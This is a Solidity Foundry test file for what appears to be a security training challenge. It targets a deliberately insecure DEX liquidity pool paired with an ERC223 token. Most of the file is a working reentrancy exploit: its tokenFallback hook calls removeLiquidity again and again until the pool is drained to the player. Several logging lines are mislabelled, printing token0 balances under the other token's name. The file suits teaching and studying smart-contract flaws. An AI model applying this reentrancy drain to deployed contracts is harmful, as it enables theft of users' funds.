// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/  
        console.log("BEFORE HACK");
        console.log("Player $ISEC Token Balance: ", token0.balanceOf(player));
        console.log("Player $SET Token Balance: ", token0.balanceOf(player));
        console.log("Player $ISEC Token Balance: ", token0.balanceOf(address(target)));
        console.log("Player $SET Token Balance: ", token0.balanceOf(address(target)));
        console.log("_______________________________________________________________");

        //init exploit Contract
        Exploit exploitContract = new Exploit(address(target));
        //grant approval to exploit contact to spend the tokens on behalf of player
        token0.approve(address(exploitContract), type(uint256).max);
        token1.approve(address(exploitContract), type(uint256).max);
        
        exploitContract.hack();    

        console.log("AFTER HACK");
        console.log("Player $ISEC Token Balance: ", token0.balanceOf(player));
        console.log("Player $SET Token Balance: ", token0.balanceOf(player));
        console.log("Player $ISEC Token Balance: ", token0.balanceOf(address(target)));
        console.log("Player $SET Token Balance: ", token0.balanceOf(address(target)));
        console.log("_______________________________________________________________");

        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 public token0; // $ISEC Token
    IERC20 public token1; // $SET Token
    InsecureDexLP public dex;

    address player;

    bool hacking; // placeholder for tokenFallback()
    uint256 _lpAmount;

    constructor(address _dexAddress) {
        player = msg.sender;
        
        dex = InsecureDexLP(_dexAddress);
        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token1.approve(_dexAddress, type(uint256).max);
        token0.approve(_dexAddress, type(uint256).max);
    }

    function hack() public {
        uint256 token0Balance = token0.balanceOf(player);
        uint256 token1Balance = token1.balanceOf(player);

        token0.transferFrom(player, address(this), token0Balance);
        token1.transferFrom(player, address(this), token1Balance);
        
        dex.addLiquidity(token0Balance, token1Balance);
        _lpAmount = dex.balanceOf(address(this));
        hacking = true;
        dex.removeLiquidity(_lpAmount);

        //Transfer tokens from Exploit Contract to Player
        token0Balance = token0.balanceOf(address(this));
        token1Balance = token1.balanceOf(address(this));
        token0.transfer(player, token0Balance);
        token1.transfer(player, token1Balance);
    }

    function tokenFallback(address _sender, uint256 value, bytes calldata data) external {
        if (!hacking) {
            return;
        }
        uint256 token0Balance = token0.balanceOf(address(dex));
        uint256 token1Balance = token1.balanceOf(address(dex));
        if(token0Balance == 0 && token1Balance == 0){
            return;
        }
        dex.removeLiquidity(_lpAmount);
    }
}